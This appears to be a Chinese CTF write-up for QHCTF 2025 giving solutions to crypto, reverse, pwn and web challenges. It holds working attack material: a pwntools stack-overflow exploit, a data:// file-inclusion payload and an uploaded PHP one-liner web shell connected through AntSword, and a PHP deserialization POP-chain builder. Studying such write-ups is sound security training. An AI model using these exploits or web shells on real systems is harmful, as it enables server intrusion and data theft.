+<h2 id="你猜猜我在哪"><a href="#你猜猜我在哪" class="headerlink" title="你猜猜我在哪"></a>你猜猜我在哪</h2><p><img src="https://image.boychai.xyz/article/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250126193202.png"><br>赛后公布的flag<br><code>QHCTF&#123;湖南省郴州市汝城县滨河大道与神农大道交叉路口&#125;</code></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy_RSA"></a>Easy_RSA</h2><p>RSA签到题难度，给了公钥与私钥，直接解即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">private_key = key.export_key()</span><br><span class="line">public_key = key.publickey().export_key()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;私钥:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(private_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;公钥:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(public_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">message, public_key</span>):</span><br><span class="line">    key = RSA.import_key(public_key)</span><br><span class="line">    cipher = PKCS1_OAEP.new(key)</span><br><span class="line">    encrypted_message = cipher.encrypt(message.encode())</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypted_message).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;Hello, this is a secret message!&quot;</span></span><br><span class="line"></span><br><span class="line">encrypted = encrypt_message(message, public_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;加密后的消息:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(encrypted)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private_key = <span class="string">b&#x27;-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQDDe2nPHYHbOm8UeieE0c2Dd8Avd7XEk3+Gi81rDkaRfbj9bNsP\n4TzkaY8VLTLuk36W6FQOowkfekbWxIx0jxNrhN2K+F5o4HQvyVDY/t14HYrWFR3c\nYo8abbrHc4RlEnxvyKlS8hlw1sPwXYvicVYE27Vdq3J7Y4VVZ8tWtBLuaQIDAQAB\nAoGAI5BJUK/qlwrLeKs8k1JkFD3uDfS2cfvvoHfAuHBRcFiyFhD+zaXJoTh/Gngt\nou/cgPHlkQAiQcLKLnp1nyMEgiK1NNwAtroS8lm1K4AZ3ltIKgqq4cnQSuFDDXZB\nw96P+DCkjI1hSRE+/TZ7cN9SllCVj6tS1Y7V76sMPNEoH80CQQDfBqSkGPWZm9zQ\nNVnrIizeEhz/aa7LJeYxirmkQy2X7Hs0vB2Y30a7ICU4LwnT+9ugFLM2mmpgrjLh\nVKN/uHL7AkEA4GJBqavJktwYCtTUnLWYIfsGMO5KZAdjZS1wvea2miZYJc6Qn61p\najON4PaSWEUQEKqk+9fwrsU3lrglmBaG6wJAE8IU5+zGJVunjlKLqscWTn4wT3hf\nYePzpsPxelnxOhpbN+rKfHabX4yTf4y7RCp15JKw5c98SSBlpYzIB1Kh7QJBANwW\nREXCZFMSYtqs62ZSkEg0SlxQPtNik9G4Am+iDtWgarGarSySEWXD75QLBnxiMWHH\nn1AO/NrQQrgpI2bMIcUCQQCI5JQzp8FmyjjOsrJiwT0NWiTdko6qMCZ4LEFMY0s8\nGylIRw11S0K+dU0LI4Xs92AxuA1BPN25KMGmwvxtWmPR\n-----END RSA PRIVATE KEY-----&#x27;</span></span><br><span class="line">public_key = <span class="string">b&#x27;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDDe2nPHYHbOm8UeieE0c2Dd8Av\nd7XEk3+Gi81rDkaRfbj9bNsP4TzkaY8VLTLuk36W6FQOowkfekbWxIx0jxNrhN2K\n+F5o4HQvyVDY/t14HYrWFR3cYo8abbrHc4RlEnxvyKlS8hlw1sPwXYvicVYE27Vd\nq3J7Y4VVZ8tWtBLuaQIDAQAB\n-----END PUBLIC KEY-----&#x27;</span></span><br><span class="line">cip = <span class="string">b&quot;v1XpEQbLRdiqwgZXbn0xBNQ7kjCD3MgwbJa+ZQUmpPz++ZFw3FGjUKL140Rqceukiwq44xGy3ZqRfPZHRg7KISN/544dWq4rHcOx4I087oTYrHVjESsBJMxnpSuBNB6jEQVcPRapDlitHsNdkphIr24cwstzLzwcf1ORpWYDugg=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_message</span>(<span class="params">encrypted_message, pri_key</span>):</span><br><span class="line">    message = base64.b64decode(encrypted_message)</span><br><span class="line">    key = RSA.import_key(pri_key)</span><br><span class="line">    cipher = PKCS1_OAEP.new(key)</span><br><span class="line">    ming = cipher.decrypt(message)</span><br><span class="line">    <span class="keyword">return</span> ming</span><br><span class="line"></span><br><span class="line">m = decrypt_message(cip,private_key)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
+
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Easy-pwn"><a href="#Easy-pwn" class="headerlink" title="Easy_pwn"></a>Easy_pwn</h2><p>经典栈溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># sh = process(&quot;./pwn1&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;154.64.245.108&quot;</span>,<span class="number">33275</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000401016</span></span><br><span class="line">back_door = <span class="number">0x0000000004011C6</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>  + p64(ret) + p64(back_door)</span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;Welcome to QHCTF 2025!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Checker"><a href="#Checker" class="headerlink" title="Checker"></a>Checker</h2><p>就一异或</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cip = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;726B607765584646154014411A400E461445160E174542410E1A4147450E4642131446131017451542165E&quot;</span>)</span><br><span class="line">cip = <span class="built_in">bytearray</span>(cip)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cip)):</span><br><span class="line">    cip[i] ^= <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cip))</span><br></pre></td></tr></table></figure>
+
+<h2 id="rainbow"><a href="#rainbow" class="headerlink" title="rainbow"></a>rainbow</h2><p>就一异或 x2<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125223120.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cip = <span class="built_in">bytearray</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;0B12190E1C213B6268686C6B6A69776F3B633B776E3C3B6D773B38393C773E3F3B6E69623B6D393F6D6227&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cip)):</span><br><span class="line">    cip[i] ^= <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cip))</span><br></pre></td></tr></table></figure>
+<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p>去下载最新版 upx来对note进行脱壳<br><a target="_blank" rel="noopener" href="https://github.com/upx/upx/releases/tag/v4.2.4">https://github.com/upx/upx/releases/tag/v4.2.4</a><br><code>brva 0x0000000000012A8</code> 下断点，即可看到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125223211.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125223215.png"></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Easy-include"><a href="#Easy-include" class="headerlink" title="Easy_include"></a>Easy_include</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$file</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;no no no ~ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过payload<code>?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbYV0pOyA/Pg==</code><br>构造一个一句话木马，直接通过蚁剑连接即可，因为是动态flag这里不多写了。</p>
+<h2 id="PCREMagic"><a href="#PCREMagic" class="headerlink" title="PCREMagic"></a>PCREMagic</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?php.*?eval.*?\(.*?\).*?\?&gt;/is&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_FILES</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_dir</span> = <span class="string">&#x27;data/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_php</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;bad request&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$user_dir</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$user_dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$user_dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$path</span>&quot;</span>, <span class="literal">true</span>, <span class="number">303</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>手写一个提交文件的网页</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">  <span class="attr">action</span>=<span class="string">&quot;http://challenge.qihangcup.cn:35056/&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Upload File&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>action写自己的靶机地址,之后上传一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>自己可以构造一个phpinfo查看禁用的函数，这里只能通过assert伪造<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125215219.png"><br>编码器记得勾选base64,不然都是不能用的，必须用编码绕过。</p>
+<h2 id="Web-IP"><a href="#Web-IP" class="headerlink" title="Web_IP"></a>Web_IP</h2><p>php的SSIT,直接构造一个查看flag的<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125215336.png"></p>
+<h2 id="Web-pop"><a href="#Web-pop" class="headerlink" title="Web_pop"></a>Web_pop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to QHCTF 2025, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>构造代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="comment">// protected $func;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __destruct()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     echo &quot;Welcome to QHCTF 2025, &quot; . $this-&gt;name;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __isset($var)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     ($this-&gt;func)();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// private $obj;</span></span><br><span class="line">    <span class="comment">// private $var;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __toString()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;obj-&gt;check($this-&gt;var);</span></span><br><span class="line">    <span class="comment">//     return &quot;CTFers&quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __invoke()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     echo file_get_contents(&#x27;/flag&#x27;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __call($fun, $var)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;cla = clone $var[0];</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __clone()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     if (isset($this-&gt;obj-&gt;cmd)) &#123;</span></span><br><span class="line">    <span class="comment">//         // echo &quot;success&quot;;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span>-&gt;func = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;obj = <span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;cla = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="keyword">var</span> = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;obj = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
